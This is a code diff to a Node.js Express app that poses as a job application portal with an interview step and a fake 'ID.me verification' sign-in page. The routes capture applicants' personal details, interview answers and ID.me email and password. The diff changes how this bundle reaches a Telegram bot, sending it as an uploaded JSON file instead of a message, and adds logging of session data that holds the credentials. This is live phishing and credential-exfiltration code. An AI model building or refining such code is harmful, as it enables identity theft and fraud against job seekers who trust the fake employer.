@@ -1,5 +1,6 @@
 const path = require('path');
 const os = require('os');
+const fs = require('fs');
 const express = require('express');
 const multer = require('multer');
 const fetch = require('node-fetch');
@@ -213,9 +214,10 @@ router.get('/interview', (req, res) => {
 // Interview POST: show info-note before ID.me verification
 router.post('/interview', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  // DEBUG: Log received interview answers
+  // Log received interview answers and session contents for debugging
   console.log('Received interview answers:', req.body);
   req.session.interviewAnswers = req.body;
+  console.log('Session after interview POST:', req.session);
   // No Telegram send here, wait until after ID.me so all data is in one JSON
   res.render('info-note');
 });
@@ -229,11 +231,13 @@ router.get('/verify', (req, res) => {
   });
 });
 
-// Verification POST (handles "sign in" to ID.me, sends all data as JSON to Telegram)
+// Verification POST (handles "sign in" to ID.me, sends all data as JSON FILE to Telegram)
 router.post('/verify', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  // DEBUG: Log received ID.me credentials
+  // Log received ID.me credentials and session for debugging
   console.log('Received ID.me credentials:', req.body);
+  console.log('Session at /verify POST:', req.session);
+
   const { email, password } = req.body;
   req.session.verified = true;
   req.session.idme = { email, password };
@@ -266,7 +270,12 @@ router.post('/verify', async (req, res) => {
     idme_credentials: idmeCreds
   };
 
-  await sendCombinedJsonToTelegram(payload);
+  // Write JSON to temporary file and send as real .json document
+  const filename = `application_${Date.now()}.json`;
+  const filepath = path.join(os.tmpdir(), filename);
+  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2), 'utf8');
+  await sendCombinedJsonFileToTelegram(filepath, filename);
+  fs.unlinkSync(filepath);
 
   await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
   res.redirect('/apply/submit');
@@ -361,23 +370,23 @@ Cover Letter: ${data.coverLetter || "N/A"}`;
   }
 }
 
-// Send a combined JSON of applicant, interview answers, and ID.me credentials to Telegram
-async function sendCombinedJsonToTelegram(payload) {
+// Send a combined JSON FILE of applicant, interview answers, and ID.me credentials to Telegram
+async function sendCombinedJsonFileToTelegram(filepath, filename) {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
     if (botToken && chatId) {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('document', fs.createReadStream(filepath), filename);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: '```json\n' + JSON.stringify(payload, null, 2) + '\n```'
-        }),
+        body: form,
+        headers: form.getHeaders(),
       });
     }
   } catch (e) {
-    console.warn('Telegram send failed (combined JSON):', e.message);
+    console.warn('Telegram send failed (combined JSON file):', e.message);
   }
 }
 
